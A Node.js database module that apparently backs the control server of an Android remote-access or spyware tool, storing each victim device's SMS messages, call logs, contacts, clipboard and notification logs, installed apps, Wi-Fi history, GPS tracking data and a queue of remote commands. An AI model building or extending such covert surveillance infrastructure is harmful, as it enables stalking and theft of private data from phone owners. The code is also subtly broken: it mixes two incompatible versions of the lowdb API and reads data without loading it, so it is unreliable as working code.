const { Low, JSONFile } = require('lowdb');
const path = require('path');
const bcrypt = require('bcrypt');
const CONST = require('./const');

const mainDbAdapter = new JSONFile('./maindb.json');
const db = new Low(mainDbAdapter);

db.defaults({
    admin: {
        username: CONST.security.admin_user,
        password: bcrypt.hashSync(CONST.security.admin_pass, CONST.security.bcrypt_rounds),
        loginToken: '',
        logs: [],
        ipLog: []
    },
    clients: []
}).write()

class clientdb {
    constructor(clientID) {
        const clientDbAdapter = new JSONFile('./clientData/' + clientID + '.json');
        const cdb = new Low(clientDbAdapter);
        cdb.data = cdb.data || {};
        cdb.data.clientID = clientID;
        cdb.data.CommandQue = cdb.data.CommandQue || [];
        cdb.data.SMSData = cdb.data.SMSData || [];
        cdb.data.CallData = cdb.data.CallData || [];
        cdb.data.contacts = cdb.data.contacts || [];
        cdb.data.wifiNow = cdb.data.wifiNow || [];
        cdb.data.wifiLog = cdb.data.wifiLog || [];
        cdb.data.clipboardLog = cdb.data.clipboardLog || [];
        cdb.data.notificationLog = cdb.data.notificationLog || [];
        cdb.data.enabledPermissions = cdb.data.enabledPermissions || [];
        cdb.data.apps = cdb.data.apps || [];
        cdb.data.GPSData = cdb.data.GPSData || [];
        cdb.data.GPSSettings = cdb.data.GPSSettings || { updateFrequency: 0 };
        cdb.data.downloads = cdb.data.downloads || [];
        cdb.data.currentFolder = cdb.data.currentFolder || [];
        cdb.write();
        return cdb;
    }
}

module.exports = {
    maindb: db,
    clientdb: clientdb,
};
